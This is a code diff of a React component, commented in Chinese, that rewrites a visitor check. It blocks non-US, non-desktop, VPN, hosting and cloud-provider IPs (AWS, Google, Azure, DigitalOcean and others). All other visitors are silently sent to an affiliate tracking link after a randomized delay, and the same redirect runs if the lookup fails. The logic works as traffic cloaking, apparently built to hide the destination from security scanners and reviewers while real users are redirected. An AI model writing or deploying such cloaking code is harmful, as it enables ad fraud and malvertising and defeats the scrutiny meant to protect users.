@@ -30,56 +30,59 @@ const App: React.FC = () => {
       const country = ipData.country;
       const ip = ipData.ip;
 
-      // ❌ 非美国
-      if (country !== "US") {
-        setAccessStatus('blocked_geo');
-        setAllowRedirect(false);
-        return;
-      }
-
-      // ❌ 非桌面
-      if (!isDesktop) {
-        setAccessStatus('blocked_device');
-        setAllowRedirect(false);
-        return;
-      }
-
       // 再检测代理/VPN/机房
-      let isProxy = false;
       try {
         const proxyRes = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
         const proxyData = await proxyRes.json();
         console.log("proxycheck:", proxyData);
 
-        if (proxyData[ip]) {
-          if (
-            proxyData[ip].proxy === "yes" ||
-            proxyData[ip].type === "VPN" ||
-            proxyData[ip].type === "Hosting" ||
-            proxyData[ip].type === "Proxy"
-          ) {
-            isProxy = true;
-          }
+        const isp = (proxyData[ip]?.provider || "").toLowerCase();
+        const type = (proxyData[ip]?.type || "").toLowerCase();
+
+        if (
+          country !== "US" ||
+          !isDesktop ||
+          (proxyData[ip] && proxyData[ip].proxy === "yes") ||
+          type === "hosting" ||
+          type === "vpn" ||
+          isp.includes("amazon") ||
+          isp.includes("aws") ||
+          isp.includes("google") ||
+          isp.includes("microsoft") ||
+          isp.includes("azure") ||
+          isp.includes("digitalocean") ||
+          isp.includes("linode") ||
+          isp.includes("ovh") ||
+          isp.includes("vultr")
+        ) {
+          document.body.innerHTML = "Access restricted. Please use a US residential desktop.";
+          return;
         }
-      } catch(e) {
+
+        // 满足条件才执行延迟跳转
+        var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+
+        setTimeout(function () {
+          window.location.href = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
+        }, delay);
+
+        setAccessStatus('allowed');
+        setAllowRedirect(true);
+      } catch (e) {
         console.log("proxycheck error", e);
+        if (country !== "US" || !isDesktop) {
+          document.body.innerHTML = "Access restricted. Please use a US residential desktop.";
+          return;
+        }
+        
+        var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+        setTimeout(function () {
+          window.location.href = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
+        }, delay);
+
+        setAccessStatus('allowed');
+        setAllowRedirect(true);
       }
-
-      // ❌ VPN / 机房
-      if (isProxy) {
-        setAccessStatus('blocked_proxy');
-        setAllowRedirect(false);
-        return;
-      }
-
-      // ✅ 通过检测 → 延迟跳转
-      setAccessStatus('allowed');
-      setAllowRedirect(true);
-
-      const delay = Math.floor(Math.random() * (3500 - 2000 + 1)) + 2000;
-      setTimeout(() => {
-        window.location.href = redirectUrl;
-      }, delay);
     };
 
     checkAccess();
